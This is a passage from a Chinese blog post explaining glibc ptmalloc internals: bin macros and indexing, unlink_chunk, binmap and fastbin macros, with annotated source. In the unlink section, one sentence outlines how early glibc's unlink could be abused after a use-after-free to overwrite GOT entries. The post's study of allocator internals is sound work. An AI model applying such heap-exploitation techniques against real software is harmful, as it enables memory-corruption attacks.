<p>这些好像有点多，一些函数的实现挪到后面malloc的地方再详细讲吧</p>
<h5 id="一些bin相关的宏"><a href="#一些bin相关的宏" class="headerlink" title="一些bin相关的宏"></a>一些bin相关的宏</h5><p>接下来是有关bin的宏，先贴一个在源码中对bins的简介。(这里就不翻译了x</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">   Bins</span></span><br><span class="line"><span class="comment">    An array of bin headers for free chunks. Each bin is doubly</span></span><br><span class="line"><span class="comment">    linked.  The bins are approximately proportionally (log) spaced.</span></span><br><span class="line"><span class="comment">    There are a lot of these bins (128). This may look excessive, but</span></span><br><span class="line"><span class="comment">    works very well in practice.  Most bins hold sizes that are</span></span><br><span class="line"><span class="comment">    unusual as malloc request sizes, but are more usual for fragments</span></span><br><span class="line"><span class="comment">    and consolidated sets of chunks, which is what these bins hold, so</span></span><br><span class="line"><span class="comment">    they can be found quickly.  All procedures maintain the invariant</span></span><br><span class="line"><span class="comment">    that no consolidated chunk physically borders another one, so each</span></span><br><span class="line"><span class="comment">    chunk in a list is known to be preceeded and followed by either</span></span><br><span class="line"><span class="comment">    inuse chunks or the ends of memory.</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">    Chunks in bins are kept in size order, with ties going to the</span></span><br><span class="line"><span class="comment">    approximately least recently used chunk. Ordering isn&#x27;t needed</span></span><br><span class="line"><span class="comment">    for the small bins, which all contain the same-sized chunks, but</span></span><br><span class="line"><span class="comment">    facilitates best-fit allocation for larger chunks. These lists</span></span><br><span class="line"><span class="comment">    are just sequential. Keeping them in order almost never requires</span></span><br><span class="line"><span class="comment">    enough traversal to warrant using fancier ordered data</span></span><br><span class="line"><span class="comment">    structures.</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">    Chunks of the same size are linked with the most</span></span><br><span class="line"><span class="comment">    recently freed at the front, and allocations are taken from the</span></span><br><span class="line"><span class="comment">    back.  This results in LRU (FIFO) allocation order, which tends</span></span><br><span class="line"><span class="comment">    to give each chunk an equal opportunity to be consolidated with</span></span><br><span class="line"><span class="comment">    adjacent freed chunks, resulting in larger free chunks and less</span></span><br><span class="line"><span class="comment">    fragmentation.</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">    To simplify use in double-linked lists, each bin header acts</span></span><br><span class="line"><span class="comment">    as a malloc_chunk. This avoids special-casing for headers.</span></span><br><span class="line"><span class="comment">    But to conserve space and improve locality, we allocate</span></span><br><span class="line"><span class="comment">    only the fd/bk pointers of bins, and then use repositioning tricks</span></span><br><span class="line"><span class="comment">    to treat these as the fields of a malloc_chunk*.</span></span><br><span class="line"><span class="comment"> */</span></span><br></pre></td></tr></table></figure>
<p>一些bins的宏。简单来说我们free的chunk不会马上返还给系统，而是放入bins中，如果之后有一些内存申请请求，而我们的bins中又有合适的chunk，就会根据情况返回。这也是局部性的一种体现。</p>
<p>当然bins的组织也是五花八门的，有用单链表的，有用双链表的。而且在合适的时机会有合并的操作。我们在这先有个大致轮廓，一般而言我们的bins有如下几种</p>
<ul>
<li>Tcache bin</li>
<li>Fast bin</li>
<li>Small bin</li>
<li>Large bin</li>
<li>Unsorted bin</li>
</ul>
<p>其实看名字也大致能知道相应的bins存放着什么样的free chunk</p>
<p>需要注意的是感觉现在Tcache bin 占了大头，需要好好分析一下</p>
<p>预知详细如何，后文再见分晓(雾)</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*定义了 mbinptr的数据类型*/</span></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">malloc_chunk</span> *<span class="title">mbinptr</span>;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/* addressing -- note that bin_at(0) does not exist */</span>(</span><br><span class="line"><span class="comment">/*求某个bin的地址(bin[0]不存在)*/</span></span><br><span class="line">#define bin_at(m, i) \</span><br><span class="line">  (mbinptr) (((<span class="keyword">char</span> *) &amp;((m)-&gt;bins[((i) - <span class="number">1</span>) * <span class="number">2</span>]))			      \</span><br><span class="line">             - offsetof (struct malloc_chunk, fd))</span><br><span class="line"></span><br><span class="line"><span class="comment">/* analog of ++bin */</span></span><br><span class="line"><span class="comment">/* 取得下一个bin的地址 */</span></span><br><span class="line">#define next_bin(b)  ((mbinptr) ((<span class="keyword">char</span> *) (b) + (<span class="keyword">sizeof</span> (mchunkptr) &lt;&lt; <span class="number">1</span>)))</span><br><span class="line"></span><br><span class="line"><span class="comment">/* Reminders about list directionality within bins */</span></span><br><span class="line"><span class="comment">// 获取bin位于链表头的chunk</span></span><br><span class="line">#define first(b)     ((b)-&gt;fd)</span><br><span class="line"><span class="comment">//获取bin位于链表尾的chunk</span></span><br><span class="line">#define last(b)      ((b)-&gt;bk)</span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">   Indexing</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">    Bins for sizes &lt; 512 bytes contain chunks of all the same size, spaced</span></span><br><span class="line"><span class="comment">    8 bytes apart. Larger bins are approximately logarithmically spaced:</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">    64 bins of size       8</span></span><br><span class="line"><span class="comment">    32 bins of size      64</span></span><br><span class="line"><span class="comment">    16 bins of size     512</span></span><br><span class="line"><span class="comment">     8 bins of size    4096</span></span><br><span class="line"><span class="comment">     4 bins of size   32768</span></span><br><span class="line"><span class="comment">     2 bins of size  262144</span></span><br><span class="line"><span class="comment">     1 bin  of size what&#x27;s left</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">    There is actually a little bit of slop in the numbers in bin_index</span></span><br><span class="line"><span class="comment">    for the sake of speed. This makes no difference elsewhere.</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">    The bins top out around 1MB because we expect to service large</span></span><br><span class="line"><span class="comment">    requests via mmap.</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">    Bin 0 does not exist.  Bin 1 is the unordered list; if that would be</span></span><br><span class="line"><span class="comment">    a valid chunk size the small bins are bumped up one.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="comment">//bins的总数(其实只有127个，bin[0]不存在)</span></span><br><span class="line">#define NBINS             <span class="number">128</span></span><br><span class="line"><span class="comment">//small bins的总数</span></span><br><span class="line">#define NSMALLBINS         <span class="number">64</span></span><br><span class="line">#define SMALLBIN_WIDTH    MALLOC_ALIGNMENT</span><br><span class="line">#define SMALLBIN_CORRECTION (MALLOC_ALIGNMENT &gt; CHUNK_HDR_SZ)</span><br><span class="line"><span class="comment">//最小的应归为large bin的free chunk的size</span></span><br><span class="line">#define MIN_LARGE_SIZE    ((NSMALLBINS - SMALLBIN_CORRECTION) * SMALLBIN_WIDTH)</span><br><span class="line"></span><br><span class="line"><span class="comment">//判断free chunk的size是否属于smallbin</span></span><br><span class="line">#define in_smallbin_range(sz)  \</span><br><span class="line">  ((<span class="keyword">unsigned</span> <span class="keyword">long</span>) (sz) &lt; (<span class="keyword">unsigned</span> <span class="keyword">long</span>) MIN_LARGE_SIZE)</span><br><span class="line"><span class="comment">//判断某个size的free chunk所对应的放入small bin的序号</span></span><br><span class="line">#define smallbin_index(sz) \</span><br><span class="line">  ((SMALLBIN_WIDTH == <span class="number">16</span> ? (((<span class="keyword">unsigned</span>) (sz)) &gt;&gt; <span class="number">4</span>) : (((<span class="keyword">unsigned</span>) (sz)) &gt;&gt; <span class="number">3</span>))\</span><br><span class="line">   + SMALLBIN_CORRECTION)</span><br><span class="line"><span class="comment">//同smallbin_index，针对不同字长与结构的细分</span></span><br><span class="line">#define largebin_index_32(sz)                                                \</span><br><span class="line">  (((((<span class="keyword">unsigned</span> <span class="keyword">long</span>) (sz)) &gt;&gt; <span class="number">6</span>) &lt;= <span class="number">38</span>) ?  <span class="number">56</span> + (((<span class="keyword">unsigned</span> <span class="keyword">long</span>) (sz)) &gt;&gt; <span class="number">6</span>) :\</span><br><span class="line">   ((((<span class="keyword">unsigned</span> <span class="keyword">long</span>) (sz)) &gt;&gt; <span class="number">9</span>) &lt;= <span class="number">20</span>) ?  <span class="number">91</span> + (((<span class="keyword">unsigned</span> <span class="keyword">long</span>) (sz)) &gt;&gt; <span class="number">9</span>) :\</span><br><span class="line">   ((((<span class="keyword">unsigned</span> <span class="keyword">long</span>) (sz)) &gt;&gt; <span class="number">12</span>) &lt;= <span class="number">10</span>) ? <span class="number">110</span> + (((<span class="keyword">unsigned</span> <span class="keyword">long</span>) (sz)) &gt;&gt; <span class="number">12</span>) :\</span><br><span class="line">   ((((<span class="keyword">unsigned</span> <span class="keyword">long</span>) (sz)) &gt;&gt; <span class="number">15</span>) &lt;= <span class="number">4</span>) ? <span class="number">119</span> + (((<span class="keyword">unsigned</span> <span class="keyword">long</span>) (sz)) &gt;&gt; <span class="number">15</span>) :\</span><br><span class="line">   ((((<span class="keyword">unsigned</span> <span class="keyword">long</span>) (sz)) &gt;&gt; <span class="number">18</span>) &lt;= <span class="number">2</span>) ? <span class="number">124</span> + (((<span class="keyword">unsigned</span> <span class="keyword">long</span>) (sz)) &gt;&gt; <span class="number">18</span>) :\</span><br><span class="line">   <span class="number">126</span>)</span><br><span class="line"><span class="comment">//和上面那个差不多</span></span><br><span class="line">#define largebin_index_32_big(sz)                                            \</span><br><span class="line">  (((((<span class="keyword">unsigned</span> <span class="keyword">long</span>) (sz)) &gt;&gt; <span class="number">6</span>) &lt;= <span class="number">45</span>) ?  <span class="number">49</span> + (((<span class="keyword">unsigned</span> <span class="keyword">long</span>) (sz)) &gt;&gt; <span class="number">6</span>) :\</span><br><span class="line">   ((((<span class="keyword">unsigned</span> <span class="keyword">long</span>) (sz)) &gt;&gt; <span class="number">9</span>) &lt;= <span class="number">20</span>) ?  <span class="number">91</span> + (((<span class="keyword">unsigned</span> <span class="keyword">long</span>) (sz)) &gt;&gt; <span class="number">9</span>) :\</span><br><span class="line">   ((((<span class="keyword">unsigned</span> <span class="keyword">long</span>) (sz)) &gt;&gt; <span class="number">12</span>) &lt;= <span class="number">10</span>) ? <span class="number">110</span> + (((<span class="keyword">unsigned</span> <span class="keyword">long</span>) (sz)) &gt;&gt; <span class="number">12</span>) :\</span><br><span class="line">   ((((<span class="keyword">unsigned</span> <span class="keyword">long</span>) (sz)) &gt;&gt; <span class="number">15</span>) &lt;= <span class="number">4</span>) ? <span class="number">119</span> + (((<span class="keyword">unsigned</span> <span class="keyword">long</span>) (sz)) &gt;&gt; <span class="number">15</span>) :\</span><br><span class="line">   ((((<span class="keyword">unsigned</span> <span class="keyword">long</span>) (sz)) &gt;&gt; <span class="number">18</span>) &lt;= <span class="number">2</span>) ? <span class="number">124</span> + (((<span class="keyword">unsigned</span> <span class="keyword">long</span>) (sz)) &gt;&gt; <span class="number">18</span>) :\</span><br><span class="line">   <span class="number">126</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">// XXX It remains to be seen whether it is good to keep the widths of</span></span><br><span class="line"><span class="comment">// XXX the buckets the same or whether it should be scaled by a factor</span></span><br><span class="line"><span class="comment">// XXX of two as well.</span></span><br><span class="line"><span class="comment">//和上面那个差不多</span></span><br><span class="line">#define largebin_index_64(sz)                                                \</span><br><span class="line">  (((((<span class="keyword">unsigned</span> <span class="keyword">long</span>) (sz)) &gt;&gt; <span class="number">6</span>) &lt;= <span class="number">48</span>) ?  <span class="number">48</span> + (((<span class="keyword">unsigned</span> <span class="keyword">long</span>) (sz)) &gt;&gt; <span class="number">6</span>) :\</span><br><span class="line">   ((((<span class="keyword">unsigned</span> <span class="keyword">long</span>) (sz)) &gt;&gt; <span class="number">9</span>) &lt;= <span class="number">20</span>) ?  <span class="number">91</span> + (((<span class="keyword">unsigned</span> <span class="keyword">long</span>) (sz)) &gt;&gt; <span class="number">9</span>) :\</span><br><span class="line">   ((((<span class="keyword">unsigned</span> <span class="keyword">long</span>) (sz)) &gt;&gt; <span class="number">12</span>) &lt;= <span class="number">10</span>) ? <span class="number">110</span> + (((<span class="keyword">unsigned</span> <span class="keyword">long</span>) (sz)) &gt;&gt; <span class="number">12</span>) :\</span><br><span class="line">   ((((<span class="keyword">unsigned</span> <span class="keyword">long</span>) (sz)) &gt;&gt; <span class="number">15</span>) &lt;= <span class="number">4</span>) ? <span class="number">119</span> + (((<span class="keyword">unsigned</span> <span class="keyword">long</span>) (sz)) &gt;&gt; <span class="number">15</span>) :\</span><br><span class="line">   ((((<span class="keyword">unsigned</span> <span class="keyword">long</span>) (sz)) &gt;&gt; <span class="number">18</span>) &lt;= <span class="number">2</span>) ? <span class="number">124</span> + (((<span class="keyword">unsigned</span> <span class="keyword">long</span>) (sz)) &gt;&gt; <span class="number">18</span>) :\</span><br><span class="line">   <span class="number">126</span>)</span><br><span class="line"><span class="comment">//根据SIZE_SZ定义的大小与MALLOC_ALIGNMENT大小选择相应的largebin_index进行调用。选择合适的过程，根据size返回对应bins的序号</span></span><br><span class="line">#define largebin_index(sz) \</span><br><span class="line">  (SIZE_SZ == <span class="number">8</span> ? largebin_index_64 (sz)                                     \</span><br><span class="line">   : MALLOC_ALIGNMENT == <span class="number">16</span> ? largebin_index_32_big (sz)                     \</span><br><span class="line">   : largebin_index_32 (sz))</span><br><span class="line"></span><br><span class="line"><span class="comment">//根据size求得在bin中的序号</span></span><br><span class="line">#define bin_index(sz) \</span><br><span class="line">  ((in_smallbin_range (sz)) ? smallbin_index (sz) : largebin_index (sz))</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>先来总结一下。一个bins数组有128个元素，对应了不同类型的bin。bins数组的元素复用了malloc_chunk的fd与bk，并通过这两个字段来实现对bin中的chunk的索引</p>
<ul>
<li>bins[0]不存在</li>
<li>bins[1]是unsorted bin</li>
<li>bins[2]-bins[63]是small bin</li>
<li>剩下的是large bin</li>
</ul>
<p>ptmalloc将<code>unsorted bin</code>、<code>small bin</code>以及<code>large bin</code>放在一个bins数组中以管理。而<code>fastbin</code>和<code>tcache bin</code>有另外的字段进行管理。</p>
<h5 id="unlink操作"><a href="#unlink操作" class="headerlink" title="unlink操作"></a>unlink操作</h5><p>接下来是一个比较重要的操作:<code>unlink_chunk</code></p>
<p>这个<code>unlink_chunk</code>值得单独拿出来分析一下。这个是个常用的操作，简单来说就是把本来链在某个bins里面的chunk给取出来，一般在某个bins中有我们想要的大小合适的chunk的时候调用它把这个chunk从bins中取出来。在<code>malloc_consolidate</code>中常常调用它进行chunk的前向与后向合并。这个在早期的glibc中是个常见的利用方式，如果存在UAF的话很容易把bss上面的地址进行更改，然后修改原本存堆地址的地方为got表地址(如果能泄露libc的话)，进而覆写。</p>
<p>这个unlink在之前的博客中分析过，但是为了内容的完整性可以再分析一下(而且我已经好久没看大概已经忘了，大部分时候都是利用的时候现学X)</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">static</span> <span class="keyword">void</span></span><br><span class="line">unlink_chunk (mstate av, mchunkptr p)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">if</span> (chunksize (p) != prev_size (next_chunk (p)))</span><br><span class="line">    malloc_printerr (<span class="string">&quot;corrupted size vs. prev_size&quot;</span>);</span><br><span class="line"></span><br><span class="line">  mchunkptr fd = p-&gt;fd;</span><br><span class="line">  mchunkptr bk = p-&gt;bk;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (__builtin_expect (fd-&gt;bk != p || bk-&gt;fd != p, <span class="number">0</span>))</span><br><span class="line">    malloc_printerr (<span class="string">&quot;corrupted double-linked list&quot;</span>);</span><br><span class="line"></span><br><span class="line">  fd-&gt;bk = bk;</span><br><span class="line">  bk-&gt;fd = fd;</span><br><span class="line">  <span class="keyword">if</span> (!in_smallbin_range (chunksize_nomask (p)) &amp;&amp; p-&gt;fd_nextsize != <span class="literal">NULL</span>)</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">if</span> (p-&gt;fd_nextsize-&gt;bk_nextsize != p</span><br><span class="line">	  || p-&gt;bk_nextsize-&gt;fd_nextsize != p)</span><br><span class="line">	malloc_printerr (<span class="string">&quot;corrupted double-linked list (not small)&quot;</span>);</span><br><span class="line"></span><br><span class="line">      <span class="keyword">if</span> (fd-&gt;fd_nextsize == <span class="literal">NULL</span>)</span><br><span class="line">	&#123;</span><br><span class="line">	  <span class="keyword">if</span> (p-&gt;fd_nextsize == p)</span><br><span class="line">	    fd-&gt;fd_nextsize = fd-&gt;bk_nextsize = fd;</span><br><span class="line">	  <span class="keyword">else</span></span><br><span class="line">	    &#123;</span><br><span class="line">	      fd-&gt;fd_nextsize = p-&gt;fd_nextsize;</span><br><span class="line">	      fd-&gt;bk_nextsize = p-&gt;bk_nextsize;</span><br><span class="line">	      p-&gt;fd_nextsize-&gt;bk_nextsize = fd;</span><br><span class="line">	      p-&gt;bk_nextsize-&gt;fd_nextsize = fd;</span><br><span class="line">	    &#125;</span><br><span class="line">	&#125;</span><br><span class="line">      <span class="keyword">else</span></span><br><span class="line">	&#123;</span><br><span class="line">	  p-&gt;fd_nextsize-&gt;bk_nextsize = p-&gt;bk_nextsize;</span><br><span class="line">	  p-&gt;bk_nextsize-&gt;fd_nextsize = p-&gt;fd_nextsize;</span><br><span class="line">	&#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>(unlink 分析)</p>
<h5 id="Binmap相关的宏"><a href="#Binmap相关的宏" class="headerlink" title="Binmap相关的宏"></a>Binmap相关的宏</h5><p>Binmap是为了表示哪个bin有free的chunk而被设计出来的(如果嗯遍历bins和FastbinY之类的非常耗时)。主要是以类似比特向量的形式,如果哪个bin中有chunk，相应的比特位就被置位</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">   Binmap</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">    To help compensate for the large number of bins, a one-level index</span></span><br><span class="line"><span class="comment">    structure is used for bin-by-bin searching.  `binmap&#x27; is a</span></span><br><span class="line"><span class="comment">    bitvector recording whether bins are definitely empty so they can</span></span><br><span class="line"><span class="comment">    be skipped over during during traversals.  The bits are NOT always</span></span><br><span class="line"><span class="comment">    cleared as soon as bins are empty, but instead only</span></span><br><span class="line"><span class="comment">    when they are noticed to be empty during traversal in malloc.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/* Conservatively use 32 bits per map word, even if on 64bit system */</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> BINMAPSHIFT      5</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> BITSPERMAP       (1U &lt;&lt; BINMAPSHIFT)</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> BINMAPSIZE       (NBINS / BITSPERMAP)</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> idx2block(i)     ((i) &gt;&gt; BINMAPSHIFT)</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> idx2bit(i)       ((1U &lt;&lt; ((i) &amp; ((1U &lt;&lt; BINMAPSHIFT) - 1))))</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> mark_bin(m, i)    ((m)-&gt;binmap[idx2block (i)] |= idx2bit (i))</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> unmark_bin(m, i)  ((m)-&gt;binmap[idx2block (i)] &amp;= ~(idx2bit (i)))</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> get_binmap(m, i)  ((m)-&gt;binmap[idx2block (i)] &amp; idx2bit (i))</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>
<h5 id="Fastbins相关宏"><a href="#Fastbins相关宏" class="headerlink" title="Fastbins相关宏"></a>Fastbins相关宏</h5><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">malloc_chunk</span> *<span class="title">mfastbinptr</span>;</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> fastbin(ar_ptr, idx) ((ar_ptr)-&gt;fastbinsY[idx])</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/* offset 2 to use otherwise unindexable first 2 bins */</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> fastbin_index(sz) \</span></span><br><span class="line">  ((((<span class="keyword">unsigned</span> <span class="keyword">int</span>) (sz)) &gt;&gt; (SIZE_SZ == <span class="number">8</span> ? <span class="number">4</span> : <span class="number">3</span>)) - <span class="number">2</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">/* The maximum fastbin request size we support */</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> MAX_FAST_SIZE     (80 * SIZE_SZ / 4)</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> NFASTBINS  (fastbin_index (request2size (MAX_FAST_SIZE)) + 1)</span></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">   FASTBIN_CONSOLIDATION_THRESHOLD is the size of a chunk in free()</span></span><br><span class="line"><span class="comment">   that triggers automatic consolidation of possibly-surrounding</span></span><br><span class="line"><span class="comment">   fastbin chunks. This is a heuristic, so the exact value should not</span></span><br><span class="line"><span class="comment">   matter too much. It is defined at half the default trim threshold as a</span></span><br><span class="line"><span class="comment">   compromise heuristic to only attempt consolidation if it is likely</span></span><br><span class="line"><span class="comment">   to lead to trimming. However, it is not dynamically tunable, since</span></span><br><span class="line"><span class="comment">   consolidation reduces fragmentation surrounding large chunks even</span></span><br><span class="line"><span class="comment">   if trimming is not used.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> FASTBIN_CONSOLIDATION_THRESHOLD  (65536UL)</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/* Maximum size of memory handled in fastbins.  */</span></span><br><span class="line"><span class="keyword">static</span> INTERNAL_SIZE_T global_max_fast;</span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">   Set value of max_fast.</span></span><br><span class="line"><span class="comment">   Use impossibly small value if 0.</span></span><br><span class="line"><span class="comment">   Precondition: there are no existing fastbin chunks in the main arena.</span></span><br><span class="line"><span class="comment">   Since do_check_malloc_state () checks this, we call malloc_consolidate ()</span></span><br><span class="line"><span class="comment">   before changing max_fast.  Note other arenas will leak their fast bin</span></span><br><span class="line"><span class="comment">   entries if max_fast is reduced.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="comment">//设置global_max_fast的值</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> set_max_fast(s) \ </span></span><br><span class="line">  global_max_fast = (((<span class="keyword">size_t</span>) (s) &lt;= MALLOC_ALIGN_MASK - SIZE_SZ)	\</span><br><span class="line">                     ? MIN_CHUNK_SIZE / <span class="number">2</span> : ((s + SIZE_SZ) &amp; ~MALLOC_ALIGN_MASK))</span><br><span class="line"></span><br><span class="line"><span class="keyword">static</span> <span class="keyword">inline</span> INTERNAL_SIZE_T</span><br><span class="line">get_max_fast (<span class="keyword">void</span>)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="comment">/* Tell the GCC optimizers that global_max_fast is never larger</span></span><br><span class="line"><span class="comment">     than MAX_FAST_SIZE.  This avoids out-of-bounds array accesses in</span></span><br><span class="line"><span class="comment">     _int_malloc after constant propagation of the size parameter.</span></span><br><span class="line"><span class="comment">     (The code never executes because malloc preserves the</span></span><br><span class="line"><span class="comment">     global_max_fast invariant, but the optimizers may not recognize</span></span><br><span class="line"><span class="comment">     this.)  */</span></span><br><span class="line">  <span class="keyword">if</span> (global_max_fast &gt; MAX_FAST_SIZE)</span><br><span class="line">    __builtin_unreachable ();</span><br><span class="line">  <span class="keyword">return</span> global_max_fast;</span><br><span class="line">&#125;<span class="comment">//取global_max_fast</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>
